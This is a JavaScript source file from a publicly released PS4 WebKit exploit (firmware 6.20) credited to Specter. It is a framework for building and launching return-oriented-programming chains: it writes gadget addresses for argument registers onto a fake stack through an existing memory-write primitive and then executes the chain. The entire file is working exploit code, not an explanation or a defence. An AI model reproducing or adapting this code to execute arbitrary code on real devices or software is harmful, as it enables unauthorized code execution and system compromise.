/*
 * PS4 WebKit Exploit 6.20
 * By Specter (@SpecterDev)
 * -
 * This file contains a framework for running ROP chains. You likely won't need to edit anything here
 * unless you need to switch gadgets out for new ones.
 */

var rop = function() {
	this.stack  = p.malloc(0x5000);
	this.retbuf = p.malloc(0x8);
	this.count  = 1;

	p.write8(this.stack, 0x1337);

	this.clear = function() {
		this.count = 1;

		for(var i = 1; i < 0xFF0 / 2; i++)
			p.write8(this.stack.add32(i * 8), 0);
	};

	this.push = function(val) {
		p.write8(this.stack.add32(this.count * 8), val);
		this.count++;
	};

	this.push_write8 = function(addr, val) {
		this.push(gadgets["pop rdi"]);
		this.push(addr);
		this.push(gadgets["pop rsi"]);
		this.push(val);
		this.push(gadgets["mov [rdi], rsi"]);
	};

	this.fcall = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
		if(rdi != undefined)
		{
			this.push(gadgets["pop rdi"]);
			this.push(rdi);
		}

		if(rsi != undefined)
		{
			this.push(gadgets["pop rsi"]);
			this.push(rsi);
		}

		if(rdx != undefined)
		{
			this.push(gadgets["pop rdx"]);
			this.push(rdx);
		}

		if(rcx != undefined)
		{
			this.push(gadgets["pop rcx"]);
			this.push(rcx);
		}

		if(r8 != undefined)
		{
			this.push(gadgets["pop r8"]);
			this.push(r8);
		}

		if(r9 != undefined)
		{
			this.push(gadgets["pop r9"]);
			this.push(r9);
		}

		this.push(rip);
		return this;
	};

	this.run = function() {
		var retv = p.launchchain(this);
		this.clear();

		return retv;
	};

	return this;
};
